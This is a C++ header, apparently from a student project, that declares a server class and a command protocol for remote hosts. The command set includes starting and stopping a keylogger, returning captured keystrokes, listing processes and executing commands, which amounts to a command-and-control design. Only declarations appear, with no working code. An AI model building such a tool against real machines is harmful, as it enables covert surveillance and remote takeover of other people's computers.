#ifndef LPTF_SERVER_HPP
#define LPTF_SERVER_HPP

#include "LPTF_Socket.h"
#include "LPTF_Packet.h"
#include <thread>
#include <string>
#include <vector>
#include <conio.h>
#include <iostream>

using namespace std;

// Command types for the client-server communication
enum class CommandType : uint8_t
{
    HOST_INFO_REQUEST = 0x01,
    START_KEYLOGGER_REQUEST = 0x02,
    STOP_KEYLOGGER_REQUEST = 0x03,
    LIST_PROCESSES_REQUEST = 0x04,
    EXECUTE_COMMAND_REQUEST = 0x05,
    SEND_MESSAGE = 0x07,
    // Response types
    HOST_INFO_RESPONSE = 0x81,
    KEY_LOG_DATA_RESPONSE = 0x82,
    PROCESS_LIST_RESPONSE = 0x84,
    COMMAND_RESULT_RESPONSE = 0x85
};

class LPTF_Server
{
public:
    // Constructor: Initializes the server with the specified IP and port
    LPTF_Server(const string &ip, int port);
    // Destructor : Cleans up the server resources
    ~LPTF_Server();

    // Copy constructor and assignment operator are deleted to prevent copying
    LPTF_Server(const LPTF_Server &) = delete;
    // Assignment Operator
    LPTF_Server &operator=(const LPTF_Server &) = delete;

    // Starts the server and listens for incoming connections
    void run();

private:
    // The IP address and port for the server
    LPTF_Socket serverSocket;

    // The IP address and port for the server for a client socket
    SOCKET clientSocket;

    // Vector of client sockets
    vector<LPTF_Socket *> clientSockets;

    // Send packet(s) and wait for the server to respond
    void handleClient(LPTF_Socket &clientSocket);

    // Handles a new client connection
    void handleConnection();

    // Receives a packet from the client
    void sendPacketToClient(LPTF_Socket &clientSocket, const std::string &data, CommandType type);

    // Handles user input for commands
    void handleAdminInput();

    // Handles commands received from the client
    void handleCommand(const LPTF_Packet &packet);
};
#endif